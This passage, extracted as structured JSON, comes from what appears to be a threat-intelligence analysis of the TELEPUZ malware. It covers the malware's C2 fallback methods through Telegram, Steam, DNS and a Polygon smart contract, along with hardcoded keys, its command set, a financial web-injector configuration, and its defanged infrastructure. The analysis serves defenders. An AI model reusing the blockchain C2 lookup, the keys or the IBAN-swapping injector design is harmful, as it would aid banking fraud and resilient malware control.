+   "text": "In the communication thread, the sample attempts to establish contact with its C2 up to 10 times, if it fails, it attempts to retrieve a fallback C2 address using 4 different methods.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b117",
+   "page": null,
+   "text": "TELEPUZ WebSocket connection retry logic attempting 10 connections before triggering C2 fallback methods",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b118",
+   "page": null,
+   "text": "These fallback methods access public resources to retrieve new C2 URLs, allowing operators to update addresses if the primary URL fails. We identified the following methods:",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b119",
+   "page": null,
+   "text": "Telegram method",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication",
+   "line_group": "b119"
+  },
+  {
+   "id": "b120",
+   "page": null,
+   "text": "TELEPUZ accesses the Telegram profile ”t[.]me/chanadarkpart, which contains the encrypted fallback URL.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication",
+   "line_group": "b119"
+  },
+  {
+   "id": "b121",
+   "page": null,
+   "text": "TELEPUZ Telegram C2 fallback channel t.me/chanadarkpart with XOR-encrypted C2 domain and kill switch",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b122",
+   "page": null,
+   "text": "The data is XOR-encrypted using the hardcoded key ”Goodman, the Steam profile and DNS record methods utilize this same encryption scheme. Decryption reveals the current C2 server at cal.snehamumbai[.]org. Examination of the channel messages indicates the channel was created in late April 2026.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b123",
+   "page": null,
+   "text": "Telegram Biography channel t.me/chanadarkpart used by TELEPUZ for C2 fallback containing XOR-encrypted domain",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b124",
+   "page": null,
+   "text": "Steam Profile",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication",
+   "line_group": "b124"
+  },
+  {
+   "id": "b125",
+   "page": null,
+   "text": "The second method is based on Steam profile usernames, the profile the malware is targeting is hxxps://steamcommunity[.]com//profiles/76561199705801219.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication",
+   "line_group": "b124"
+  },
+  {
+   "id": "b126",
+   "page": null,
+   "text": "Steam profile page containing TELEPUZ C2 fallback domain encrypted with hardcoded key showing profile history",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b127",
+   "page": null,
+   "text": "The profile name contains the same C2 address found in the Telegram channel. The profile's name history reveals both the C2 domain configured in the malware (cal.joycedoula[.]com[.]br) and this one again but encrypted with the key 111111111.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b128",
+   "page": null,
+   "text": "DNS record",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication",
+   "line_group": "b128"
+  },
+  {
+   "id": "b129",
+   "page": null,
+   "text": "The DNS record method does a DNS query for the domain codebasecode[.]com, it then extracts and decrypts the fallback C2 from the information returned. However so far we haven’t found any record associated with this domain.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication",
+   "line_group": "b128"
+  },
+  {
+   "id": "b130",
+   "page": null,
+   "text": "Polygon blockchain",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication",
+   "line_group": "b130"
+  },
+  {
+   "id": "b131",
+   "page": null,
+   "text": "TELEPUZ initiates a JsonRPC HTTP POST request to the Polygon blockchain using pre-configured endpoints, targeting the smart contract address 0xf55Bea1FdCf1c3ABb39ab92567C09aC1BFf6753E with the method selector 0xc3f909d4.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication",
+   "line_group": "b130"
+  },
+  {
+   "id": "b132",
+   "page": null,
+   "text": "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"eth_call\",\"params\":[{\"to\":\"0xf55Bea1FdCf1c3ABb39ab92567C09aC1BFf6753E\",\"data\":\"0xc3f909d4\"},\"latest\"]}",
+   "type": "code",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b133",
+   "page": null,
+   "text": "TELEPUZ Polygon blockchain RPC endpoints used for C2 fallback method via Ethereum JSON-RPC calls",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b134",
+   "page": null,
+   "text": "From the returned result TELEPUZ parses the encrypted data and decrypt it using AES256-CBC with the key ”cee96a38e2dfe31ccf8c3aa7d0d9323e1e3183b2478ba582285822e943d242e9.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b135",
+   "page": null,
+   "text": "h=cal.snehamumbai[.]org|p=443|ssl=1",
+   "type": "code",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b136",
+   "page": null,
+   "text": "The smart contract also acts as a kill switch mechanism; if the returned result is fewer than 10 bytes, the malware calls ExitThread.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b137",
+   "page": null,
+   "text": "TELEPUZ Polygon blockchain kill switch mechanism checking data size to trigger ExitThread",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b138",
+   "page": null,
+   "text": "A review of the smart contract address on a blockchain explorer reveals when the contract got created and recent activity at the time of writing.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b139",
+   "page": null,
+   "text": "Polygon blockchain smart contract explorer showing TELEPUZ C2 retrieval mechanism with 70-day transaction history",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b140",
+   "page": null,
+   "text": "Once the C2 is resolved, it establishes communication using WebSockets with optional TLS. The WebSocket URL is /cdn/health?sid=, where the sid parameter is the session ID/victim identifier previously generated. Rather than using standard internet libraries, it manually establishes the connection via a TCP socket with hardcoded HTTP headers, and then uses the WebSocket protocol to communicate with the C2 server.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b141",
+   "page": null,
+   "text": "TELEPUZ WebSocket C2 communication establishing connection to cal.joycedoula.com.br with HTTP upgrade headers",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b142",
+   "page": null,
+   "text": "If TLS is enabled, the malware establishes the tunnel using the Secure Channel (SChannel) provided by the Windows Security Support Provider (SSP). To perform the handshake, it uses the InitializeSecurityContextA function in a loop. In each iteration, it generates TLS data to send to the C2, receives the server's response, and feeds that response back into the same function to generate the subsequent handshake data.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b143",
+   "page": null,
+   "text": "TELEPUZ TLS handshake initialization using Windows SChannel security context for encrypted C2 communication",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b144",
+   "page": null,
+   "text": "Once the WebSocket connection is established, the malware utilizes a simple JSON-based protocol. We implemented a very simple flask-sock server to receive the beacon data.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b145",
+   "page": null,
+   "text": "TELEPUZ JSON beacon message to C2 containing hostname, username, OS version, architecture and system information",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b146",
+   "page": null,
+   "text": "TELEPUZ commands and capabilities",
+   "type": "heading",
+   "level": 3,
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b147",
+   "page": null,
+   "text": "TELEPUZ receives commands from its C2 server either as plain text or as a hash. If a command is received as text, the malware computes its corresponding hash locally. The hashing algorithm is described below:",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b148",
+   "page": null,
+   "text": "def hash_command_name(name):",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b148"
+  },
+  {
+   "id": "b149",
+   "page": null,
+   "text": "h = 0x1505",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b148"
+  },
+  {
+   "id": "b150",
+   "page": null,
+   "text": "for c in name:",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b148"
+  },
+  {
+   "id": "b151",
+   "page": null,
+   "text": "h = (ord(c) ^ (0x21 * h)) & 0xFFFFFFFF",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b148"
+  },
+  {
+   "id": "b152",
+   "page": null,
+   "text": "return h",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b148"
+  },
+  {
+   "id": "b153",
+   "page": null,
+   "text": "The malware currently has 36 commands, they are described in the table below:",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b154",
+   "page": null,
+   "text": "Hash | Command ¶ 0x7C82BBEB | Beacon ¶ 0x94822A12 | CreateZip ¶ 0x98712C1C | Delete ¶ 0x92D09E05 | DownloadFile ¶ 0x3098F2D8 | DownloadLoadMalwareModule ¶ 0xACD43E91, 0x0D9B6199 | DownloadRunPE ¶ 0xFF55DC66 | DownloadRunModule ¶ 0x1084A429 | DownloadStartKeyLogger ¶ 0xCA4A8C1D | DownloadStartStealer ¶ 0x7117B24A | DownloadStartWebInjectModule ¶ 0x4C9F6E6F | ElevateToAdmin ¶ 0x037825F6 | ElevateToSystem ¶ 0x99C81E9A | EnumerateDriveInfo ¶ 0x69224E1A | ExecuteCommand ¶ 0xF6E8CE40 | ExtractChromeCookiesUsingDownloadedChromeElevator ¶ 0x2D858A03 | GetCurrentTokenStatus ¶ 0xDE853911 | GetKeyLoggerStatus ¶ 0x82E18E66 | GetPathsInfo ¶ 0xA823945A | InjectShellcode ¶ 0x323BE80B | KeyLoggerEnableDisableFormFlush ¶ 0x7C8B2DA7 | Kill ¶ 0xA5BD70FF | KillJob ¶ 0xA5BAAA7F | ListJobs ¶ 0x005974C6 | ListRunningProcesses ¶ 0x0059735A | Ls ¶ 0x8BC0E38D | MaybePrivescDisabled ¶ 0x7F593804 | MigrateIntoProcess ¶ 0xBCDE59A3 | RevertToken ¶ 0xA6EC9549 | Screenshot ¶ 0x77E0A2E7 | SetBeaconInterval ¶ 0xDED585EE | StealProcessToken ¶ 0xF4040E98 | StopMalwareModule ¶ 0xB14E7AF4 | UpdateMalware ¶ 0xB152C246 | Upload ¶ 0xB70B7E99 | WriteToWebInjectModulePipe",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "0x7C82BBEB",
+      "Beacon"
+     ],
+     [
+      "0x94822A12",
+      "CreateZip"
+     ],
+     [
+      "0x98712C1C",
+      "Delete"
+     ],
+     [
+      "0x92D09E05",
+      "DownloadFile"
+     ],
+     [
+      "0x3098F2D8",
+      "DownloadLoadMalwareModule"
+     ],
+     [
+      "0xACD43E91, 0x0D9B6199",
+      "DownloadRunPE"
+     ],
+     [
+      "0xFF55DC66",
+      "DownloadRunModule"
+     ],
+     [
+      "0x1084A429",
+      "DownloadStartKeyLogger"
+     ],
+     [
+      "0xCA4A8C1D",
+      "DownloadStartStealer"
+     ],
+     [
+      "0x7117B24A",
+      "DownloadStartWebInjectModule"
+     ],
+     [
+      "0x4C9F6E6F",
+      "ElevateToAdmin"
+     ],
+     [
+      "0x037825F6",
+      "ElevateToSystem"
+     ],
+     [
+      "0x99C81E9A",
+      "EnumerateDriveInfo"
+     ],
+     [
+      "0x69224E1A",
+      "ExecuteCommand"
+     ],
+     [
+      "0xF6E8CE40",
+      "ExtractChromeCookiesUsingDownloadedChromeElevator"
+     ],
+     [
+      "0x2D858A03",
+      "GetCurrentTokenStatus"
+     ],
+     [
+      "0xDE853911",
+      "GetKeyLoggerStatus"
+     ],
+     [
+      "0x82E18E66",
+      "GetPathsInfo"
+     ],
+     [
+      "0xA823945A",
+      "InjectShellcode"
+     ],
+     [
+      "0x323BE80B",
+      "KeyLoggerEnableDisableFormFlush"
+     ],
+     [
+      "0x7C8B2DA7",
+      "Kill"
+     ],
+     [
+      "0xA5BD70FF",
+      "KillJob"
+     ],
+     [
+      "0xA5BAAA7F",
+      "ListJobs"
+     ],
+     [
+      "0x005974C6",
+      "ListRunningProcesses"
+     ],
+     [
+      "0x0059735A",
+      "Ls"
+     ],
+     [
+      "0x8BC0E38D",
+      "MaybePrivescDisabled"
+     ],
+     [
+      "0x7F593804",
+      "MigrateIntoProcess"
+     ],
+     [
+      "0xBCDE59A3",
+      "RevertToken"
+     ],
+     [
+      "0xA6EC9549",
+      "Screenshot"
+     ],
+     [
+      "0x77E0A2E7",
+      "SetBeaconInterval"
+     ],
+     [
+      "0xDED585EE",
+      "StealProcessToken"
+     ],
+     [
+      "0xF4040E98",
+      "StopMalwareModule"
+     ],
+     [
+      "0xB14E7AF4",
+      "UpdateMalware"
+     ],
+     [
+      "0xB152C246",
+      "Upload"
+     ],
+     [
+      "0xB70B7E99",
+      "WriteToWebInjectModulePipe"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Hash",
+     "Command"
+    ]
+   },
+   "layout": "table",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b155",
+   "page": null,
+   "text": "To maintain a lightweight footprint, TELEPUZ downloads additional functional modules from its C2 server, such as stealer, keylogger, web injector, and cookie extraction modules for Chromium-based browsers.",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b155"
+  },
+  {
+   "id": "b156",
+   "page": null,
+   "text": "Operators can specify a custom URI, though commands default to pre-configured values. For example, the ExtractChromeCookiesUsingDownloadedChromeElevator command retrieves a compiled binary of the Chrome-App-Bound-Encryption-Decryption project, defaulting to the path /static/assets/chromeelevator.bin.",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b155"
+  },
+  {
+   "id": "b157",
+   "page": null,
+   "text": "TELEPUZ DownloadRunPE command retrieving Chrome-App-Bound-Encryption-Decryption tool from C2 server",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b158",
+   "page": null,
+   "text": "The table below describes these default module URIs, they appear to be consistent across samples.",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b159",
+   "page": null,
+   "text": "Module | Path ¶ KeyLogger | /static/modules/kMP6HBGEA8.bin ¶ WebInjector | /static/modules/yaVaoS3Bw.bin ¶ Stealer | /static/modules/W2UMxylgG\\_.bin ¶ ChromeCookie extractor | /static/assets/chromelevator.bin",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "KeyLogger",
+      "/static/modules/kMP6HBGEA8.bin"
+     ],
+     [
+      "WebInjector",
+      "/static/modules/yaVaoS3Bw.bin"
+     ],
+     [
+      "Stealer",
+      "/static/modules/W2UMxylgG\\_.bin"
+     ],
+     [
+      "ChromeCookie extractor",
+      "/static/assets/chromelevator.bin"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Module",
+     "Path"
+    ]
+   },
+   "layout": "table",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b160",
+   "page": null,
+   "text": "The WebInjector module is a PE executable that communicates with TELEPUZ via standard I/O handles (STDIN, STDOUT, STDERR). TELEPUZ transmits its configuration in JSON format to the module via STDIN. The following is an LLM-reconstructed version based on the identified fields.",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b161",
+   "page": null,
+   "text": "\"wait_idle\": \"bool, default true\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b162",
+   "page": null,
+   "text": "\"idle_timeout_sec\": \"int, default 15\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b163",
+   "page": null,
+   "text": "\"auto_forward_timeout_ms\": \"int, default 30000\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b164",
+   "page": null,
+   "text": "\"probe_port_start\": \"int, default 9222\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b165",
+   "page": null,
+   "text": "\"probe_port_end\": \"int, default 9229\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b166",
+   "page": null,
+   "text": "\"force_kill_browser\": \"bool, default false\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b167",
+   "page": null,
+   "text": "\"attach_all_tabs\": \"bool, default true\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b168",
+   "page": null,
+   "text": "\"debug_reports\": \"bool, default true\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b169",
+   "page": null,
+   "text": "\"intercept_hold\": \"bool, default false\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b170",
+   "page": null,
+   "text": "\"attach_only\": \"bool, default false\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b171",
+   "page": null,
+   "text": "\"browser\": \"string[16], default 'chrome'\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b172",
+   "page": null,
+   "text": "\"c2_host\": \"string[256]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b173",
+   "page": null,
+   "text": "\"c2_port\": \"int, default 0\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b174",
+   "page": null,
+   "text": "\"c2_ssl\": \"bool, default false\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b175",
+   "page": null,
+   "text": "\"bot_id\": \"string[64]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b176",
+   "page": null,
+   "text": "\"sdk\": \"string[65536]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b177",
+   "page": null,
+   "text": "\"intercept_filter\": \"string[256]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b178",
+   "page": null,
+   "text": "\"targets\": [",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b179",
+   "page": null,
+   "text": "\"url_match\": \"string[256]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b180",
+   "page": null,
+   "text": "\"name\": \"string[64]\"",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b181",
+   "page": null,
+   "text": "],",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b182",
+   "page": null,
+   "text": "\"actions\": [",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b183",
+   "page": null,
+   "text": "\"id\": \"string[64]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b184",
+   "page": null,
+   "text": "\"type\": \"string[32]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b185",
+   "page": null,
+   "text": "\"trigger\": \"string[32]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b186",
+   "page": null,
+   "text": "\"trigger_url\": \"string[256]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b187",
+   "page": null,
+   "text": "\"template\": \"string[32768]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b188",
+   "page": null,
+   "text": "\"template_b64\": \"string[32768], base64 decoded into template\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b189",
+   "page": null,
+   "text": "\"grab_fields\": \"string[1024]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b190",
+   "page": null,
+   "text": "\"delay_ms\": \"int, default 0\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b191",
+   "page": null,
+   "text": "\"once\": \"bool, default false\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b192",
+   "page": null,
+   "text": "\"request_stage\": \"bool, default true (swap_fields only)\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b193",
+   "page": null,
+   "text": "\"response_stage\": \"bool, default true (swap_fields only)\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b194",
+   "page": null,
+   "text": "\"fields\": {",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b195",
+   "page": null,
+   "text": "\"iban\": \"string[64]\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b196",
+   "page": null,
+   "text": "\"amount_max\": \"int, default 0\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b197",
+   "page": null,
+   "text": "\"field_name\": \"string[32], default 'iban'\",",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b198",
+   "page": null,
+   "text": "\"amount_field\": \"string[32], default 'amount'\"",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b199",
+   "page": null,
+   "text": "},",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b200",
+   "page": null,
+   "text": "\"response_filter\": {",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b201",
+   "page": null,
+   "text": "\"remove_where_iban\": \"string[64]\"",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities",
+   "line_group": "b161"
+  },
+  {
+   "id": "b202",
+   "page": null,
+   "text": "The module can connect directly to the C2 via WebSocket on the URI /ws/inject?cid= if the connection information is provided in the configuration, allowing it to receive and execute commands directly. Otherwise, it relies on TELEPUZ as a middleman, using the WriteToWebInjectModulePipe command for communication. The module operates on Chromium-based browsers and Firefox. These commands allow the operator to control the injector, manage rules, steal cookies, execute JavaScript, and enable interception capabilities.",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b203",
+   "page": null,
+   "text": "TELEPUZ WebInjector module targeting Chrome, Firefox, Edge, Brave and Opera browsers for form field interception",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b204",
+   "page": null,
+   "text": "Despite its name, the WebInjector module does not need to inject into or hook the browser. Instead, it interacts with Chromium-based browsers using the Chrome DevTools Protocol (CDP), which exposes APIs for browser interaction. The Firefox equivalent is the WebDriver BiDi protocol. Based on the configuration, the module can intercept webpages at various stages to execute its “actions.” Default values appear centered on swapping form fields containing financial information, such as the IBAN.",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b205",
+   "page": null,
+   "text": "TELEPUZ WebInjector module creating BiDi session using Chrome DevTools Protocol for browser interception",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b206",
+   "page": null,
+   "text": "TELEPUZ offers several methods for executing code. The DownloadRunPE command downloads a PE executable from a specified URL, creates a dllhost.exe process, with optional elevated privileges, and performs process hollowing with the downloaded PE. Optionally, it can also hollow its own process. The DownloadRunModule command is similar but retrieves the PE from the C2 using a provided path and tracks up to eight modules in a management table. The DownloadLoadMalwareModule command differs slightly: it loads a malware-compatible DLL with known exports, likely to add features or perform additional tasks.",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b207",
+   "page": null,
+   "text": "TELEPUZ AgentEnvConnect export function using CustomRC4 decryption with known malware DLL exports",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b208",
+   "page": null,
+   "text": "Interestingly the shellcode process injection command is not yet implemented and currently returns INJECT:TODO:pid=%u:shellcode_len=%u, confirming that the malware is still in active development. Finally, the GetPathsInfo command provides detailed information about the malware's current installation.",
+   "type": "paragraph",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b209",
+   "page": null,
+   "text": "PATHINFO:{\"running_from\":\"C:\\\\Users\\\\Lab\\\\Desktop\\\\telepuz.dll\",\"in_temp\":false,\"install_path\":\"C:\\\\ProgramData\\\\XeroxPrint\\\\Temp\\\\Worker\\\\grpeng.dll\",\"install_exists\":true,\"stager_path\":\"C:\\\\Users\\\\Lab\\\\AppData\\\\Roaming\\\\D3DSCache\\\\amd64\\\\SvcValidator.dll\",\"stager_exists\":false,\"persist_dir\":\"DCFG\\\\Runtime\\\\Themes\\\\Processor\",\"persist_name\":\"etwhost.dll\",\"marker_key\":\"Software\\\\Microsoft\\\\VisualStudio\\\\Telemetry\",\"service_exists\":true,\"service_name\":\"CipherAllocator\",\"host_process\":\"rundll32.exe\",\"host_pid\":5568}",
+   "type": "code",
+   "section": "TELEPUZ commands and capabilities"
+  },
+  {
+   "id": "b210",
+   "page": null,
+   "text": "TELEPUZ campaign timeline and C2 infrastructure",
+   "type": "heading",
+   "level": 2,
+   "section": "TELEPUZ campaign timeline and C2 infrastructure"
+  },
+  {
+   "id": "b211",
+   "page": null,
+   "text": "The first TELEPUZ sample was submitted on May 2, 2026. Since then, we have observed regular submissions of new builds, with a steady increase in binary size, and since early June, a significant spike in volume, confirming the campaign's high activity. However, dates from the Telegram channel and the Polygon smart contract indicate that activity began around April 27–29.",
+   "type": "paragraph",
+   "section": "TELEPUZ campaign timeline and C2 infrastructure"
+  },
+  {
+   "id": "b212",
+   "page": null,
+   "text": "The download URLs typically follow the pattern /files/telemetriawork/telepuz.dll. However, variations exist, such as telemetry/network/telepuz.dll or /files/telemetrywork/telepuz. Interestingly, some early versions retained the /file/ structure but randomized the remainder of the path, for example, /files/xK7mR9pL2nQw5tY8/ygvfuyze.dll. The complete list is available in the IOCs chapter.",
+   "type": "paragraph",
+   "section": "TELEPUZ campaign timeline and C2 infrastructure"
+  },
+  {
+   "id": "b213",
+   "page": null,
+   "text": "Although numerous domains host the malware's stages and main payload, C2 infrastructure is notably more limited. We have identified two primary domains: cal.joycedoula[.]com[.]br, which has been present in configurations since the earliest VirusTotal samples, and cal.snehamumbai[.]org, discovered through fallback methods. Interestingly, both utilize a 'cal.*' subdomain and appear to be legitimate websites compromised by the actor. Based on configuration history and fallback resolution, these domains constitute the core C2 infrastructure, distinct from the payload hosting locations. Their limited number suggests that what we think is a MaaS is still in its early stages, despite the high volume of builds generated. While the staging domains are protected by Cloudflare, concealing their true hosting locations, the C2 servers have been identified as compromised websites located in Brazil and India, respectively.",
+   "type": "paragraph",
+   "section": "TELEPUZ campaign timeline and C2 infrastructure"
+  },
+  {
+   "id": "b214",
+   "page": null,
+   "text": "Joyce Reis Brazilian aromatherapy website compromised and used as TELEPUZ C2 infrastructure hosted in Brazil",
+   "type": "paragraph",
+   "section": "TELEPUZ campaign timeline and C2 infrastructure"
+  },
+  {
+   "id": "b215",
+   "page": null,
+   "text": "TELEPUZ indicators of compromise",
+   "type": "heading",
+   "level": 2,
+   "section": "TELEPUZ indicators of compromise"
+  },
+  {
+   "id": "b216",
+   "page": null,
+   "text": "The table below lists the staging domain and URLs for the second and third stages:",
+   "type": "paragraph",
+   "section": "TELEPUZ indicators of compromise"
+  },
+  {
+   "id": "b217",
+   "page": null,
